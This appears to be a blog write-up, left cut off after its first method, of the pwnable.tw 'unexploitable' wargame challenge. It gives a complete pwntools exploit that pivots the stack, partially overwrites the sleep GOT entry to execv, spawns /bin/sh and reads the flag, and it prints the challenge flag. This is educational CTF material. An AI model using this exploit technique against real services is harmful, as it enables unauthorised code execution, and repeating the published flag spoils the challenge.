---
title: '[PWNABLE.TW] - unexploitable'
description: 'Nothing is unexploitable, even if it seems so...'
image: '../../../img/cover_photo_wargame_imresizer.png'
date: 2025-05-05
tags: ['2025', 'Wargame', 'pwnable.tw']
authors: ['kdot']
draft: true
---

import Challenge from '@/components/mdx/Challenge.astro'
import Callout from '@/components/Callout.astro'

## Challenge Information

<Challenge
  category="pwn"
  points={500}
  description="The original challenge is on pwnable.kr and it is solvable. This time we fix the vulnerability and now we promise that the service is unexploitable."
  flag="FLAG{4_r34lLy_Un3Xpl01T48l3_S3Rv1C3_Sh0UlD_n0T_H4v3_SYsC4ll_1NS1D3}"
>
</Challenge>

## Reverse Engineering

Let's start with checking the binary mitigations. We can use `checksec` to do that:


```sh title='checksec'
alter ^ Sol in /mnt/e/sec/lab/pwnable.tw/unexploitable
$ checksec unexploitable
[*] '/mnt/e/sec/lab/pwnable.tw/unexploitable/unexploitable'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

We can see that the binary is not stripped, which is a good thing for us. We can also see that there is no stack canary, which means we can overwrite the return address of a function. The binary is also not position independent, which means that the address of the functions will be the same every time we run the binary. Dive into the decompiled code to see what is going on

```c title='IDA'
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  sleep(3u);
  return read(0, buf, 0x100uLL);
}
```

There's only have one `main` function. In this function, we can see that it sleeps for 3 seconds and then calls the `read` function. The `read` function reads `0x100` bytes from the standard input into the buffer `buf`. The buffer is only 16 bytes long, so we have `Buffer Overflow` here.

## Exploit Strategies

With only one function in the binary, and it allows us just to read `0x100` bytes into a buffer, no leak, no `win` function. So what we can do now?
I have I few ideas in my mind:

- Because there is `Partial RELRO`, we can overwrite the GOT entry of `sleep` function to point to `execv` function. This function is not too far from the `sleep` function, so we can completely overwrite it with `Partial Overwrite`
- We see that we have `read` function which will return the number of bytes read, and we also have `syscall` gadget if we use partial overwrite to overwrite `sleep` function to `syscall` gadget. In this way we can do SROP
- The binary has `__libc_csu_init`, which is really over power function. We can call everything using this function. This technique also called `ret2csu`

And in this write up, I will still give the method of doing the three in as much detail as possible.

## Exploit

### Method 1: Stack Pivot

I call this method Stack Pivot because my whole process is just pivoting and overwriting `sleep` -> `execv`. But first let's collect some useful gadgets

```py title='exploit.py'
        mov_edi = 0x400600      # mov edi,  [rsp+0x30] ; add rsp, 0x38 ; ret ;
        leave_ret = 0x400576
        ret = leave_ret + 1
        read_gadget = 0x40055B
```

In this way I will mainly use these 4 gadgets. Everything has only one strange thing, the `mov` gadget, because the `__libc_csu_init` function in this binary has been recoded so it doesn't have the `pop` gadgets like before, but that's okay the mov gadget still has a similar function. And the reason I chose the `execv` function is because it really only needs one argument to drop the shell for us. According to the man page we can know that:

```sh title='execv manpage'
SYNOPSIS
    #include <unistd.h>

    extern char **environ;
    int execv(const char *pathname, char *const argv[]);

DESCRIPTION
    <...>
    v - execv(), execvp(), execvpe()
       The char *const argv[] argument is an array of pointers to null-terminated strings that represent the argument list available to the new program.  The first argument, by convention, should point to the  filename  associated
       with the file being executed.  The array of pointers must be terminated by a null pointer.
```

So first we will start pivoting, because we will pivot into the section of `sleep@GOT` and when it returns it will return `sleep@GOT + 0x18`, so our first payload will have to be to read some areas of `sleep@GOT + 0x10 + 0x10` then when we return in payload 2 when we use it to write to `sleep@GOT` it will have data to return. So our payload 1 will be like this:

```py title='exploit.py'
        offset = 0x10
        read_gadget = 0x40055B
        bss = 0x601800
        mov_edi = 0x400600      # mov edi,  [rsp+0x30] ; add rsp, 0x38 ; ret ;
        leave_ret = 0x400576
        ret = leave_ret + 1

        payload = flat({
            offset: [
                exe.got.sleep + 0x10 + 0x10,
                read_gadget
            ]
        }, filler=b'A')

        # input("Payload 1")
        sleep(4)
        s(payload)
```

And payload 2 is the same when it returns it will return to `sleep@GOT + 0x18`. Because our payload 2 will start from `sleep@GOT + 0x10` so we will set up a place so that after reading it will return to:

```py title='exploit.py'
        # Start at 0x601020
        payload = flat(

            bss - 0x100 + 0x10,
            read_gadget,

            exe.got.sleep + 0x10,
            read_gadget

        )

        # input("Payload 2")
        sleep(0.5)
        s(payload)

        # input("Payload 3")
        sleep(0.5)
        s(p16(0x9cb0))
```

It looks complicated but let me debug it for you

```sh title='GDB'
pwndbg> x/20xg 0x601010
0x601010 <sleep@got.plt>:       0x00007ffff7ad9680      0x0000000000000000
0x601020:                       0x0000000000601710      0x000000000040055b (2)
0x601030 <dtor_idx.6533>:       0x0000000000601020      0x000000000040055b (1)
0x601040:                       0x0000000000000000      0x0000000000000000
0x601050:                       0x0000000000000000      0x0000000000000000
0x601060:                       0x0000000000000000      0x0000000000000000
0x601070:                       0x0000000000000000      0x0000000000000000
0x601080:                       0x0000000000000000      0x0000000000000000
0x601090:                       0x0000000000000000      0x0000000000000000
0x6010a0:                       0x0000000000000000      0x0000000000000000
```

This is the data when I read the 2nd payload in, and when it executes first it will execute the gadget at address `0x601038` first then when it returns it will take the value of `saved RBP` at `0x601030` which is `0x601020` to return then it continues to execute and gives us the 3rd read. And now we check in the GOT table and see that `sleep` has been overwritten to `execv`

```sh title='GDB'
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /mnt/e/sec/lab/pwnable.tw/unexploitable/unexploitable_patched:
GOT protection: Partial RELRO | Found 3 GOT entries passing the filter
[0x601000] read@GLIBC_2.2.5 -> 0x7ffff7b04670 (read) â—‚â€” cmp dword ptr [rip + 0x2d20c9], 0
[0x601008] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7a2e740 (__libc_start_main) â—‚â€” push r14
[0x601010] sleep@GLIBC_2.2.5 -> 0x7ffff7ad9cb0 (execv) â—‚â€” mov rax, qword ptr [rip + 0x2f7201]
```

And the last thing we will do is set up the necessary things to call `execv`. I won't explain this part too much because it's not too complicated. You can debug my script to understand better.

```py title='exploit.py'
    # Start at 0x601700
    payload = flat(

        0,
        mov_edi,

        bss - 0x100,
        leave_ret,

        b'C'*0x20,
        p64(bss - 0x100 + 0x50),
        exe.plt.sleep,
        b'/bin/sh\0',

    )

    input("Payload 4")
    sleep(0.5)
    s(payload)
```

Because ASLR is always enabled, we need to brute force when running the script in remote. **Note** that the program will read our input after sleeping for 3 seconds, so to be safe and not mess up our inputs, we should let our exploit sleep for 4 seconds before reading the first payload, and don't forget to let the exploit sleep in small intervals so that the input readings don't overlap.

<details id="full exploit">
<summary>**Full exploit**</summary>
<p>

```py title='exploit.py'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./unexploitable_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
# b *0x400576
b *0x400577
c
'''

# ==================== EXPLOIT ====================

while True:
    p = start()

    def exploit():

        offset = 0x10
        read_gadget = 0x40055B
        bss = 0x601800
        mov_edi = 0x400600      # mov edi,  [rsp+0x30] ; add rsp, 0x38 ; ret ;
        leave_ret = 0x400576
        ret = leave_ret + 1

        payload = flat({
            offset: [
                exe.got.sleep + 0x10 + 0x10,
                read_gadget
            ]
        }, filler=b'A')

        # input("Payload 1")
        sleep(4)
        s(payload)

        # Start at 0x601020
        payload = flat(

            bss - 0x100 + 0x10,
            read_gadget,

            exe.got.sleep + 0x10,
            read_gadget

        )

        # input("Payload 2")
        sleep(0.5)
        s(payload)

        # input("Payload 3")
        sleep(0.5)
        s(p16(0x9cb0))

        # Start at 0x601700
        payload = flat(

            0,
            mov_edi,

            bss - 0x100,
            leave_ret,

            b'C'*0x20,
            p64(bss - 0x100 + 0x50),
            exe.plt.sleep,
            b'/bin/sh\0',

        )

        # input("Payload 4")
        sleep(0.5)
        s(payload)

        try:
            sleep(0.5)
            sl(b'echo WIN!!')
            ru(b'WIN!!')
            return True
        except:
            close()
            return False

        interactive()

    if __name__ == '__main__':
        if exploit():
            sl(b'cat /home/unexploitable/f*')
            interactive()
            break
# FLAG{4_r34lLy_Un3Xpl01T48l3_S3Rv1C3_Sh0UlD_n0T_H4v3_SYsC4ll_1NS1D3}
```

Yes yes, I think this is unintended solution base on that flag ðŸ¥¹
</p>
</details>

### Method 2: SROP
